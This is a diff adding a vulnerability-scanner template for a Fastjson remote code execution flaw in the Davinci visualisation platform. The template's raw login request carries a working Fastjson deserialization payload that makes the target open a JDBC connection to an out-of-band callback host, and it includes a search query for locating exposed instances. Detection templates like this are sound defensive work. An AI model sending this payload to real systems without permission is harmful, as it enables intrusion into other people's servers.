@@ -1,0 +1,36 @@
+id: davinci-fastjson-rce
+
+info:
+  name: Davinci - Fastjson RCE
+  author: qwtd
+  severity: critical
+  description: Davinci面向业务人员/数据工程师/数据分析师/数据科学家，致力于提供一站式数据可视化解决方案，最新的rc-3版本中存在Fastjson远程代码执行漏洞.
+  reference:
+    - https://github.com/edp963/davinci/
+  metadata:
+    verified: true
+    max-request: 1
+    hunter-query: web.title="Login - Davinci"
+  tags: Davinci
+
+http:
+  - raw:
+      - |
+        POST /api/v3/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 362
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"{{interactsh-url}}","portToConnectTo":80,"info":{"user":"root","password":"ubuntu","useSSL":"false","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"},"databaseToConnectTo":"mysql","url":""}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
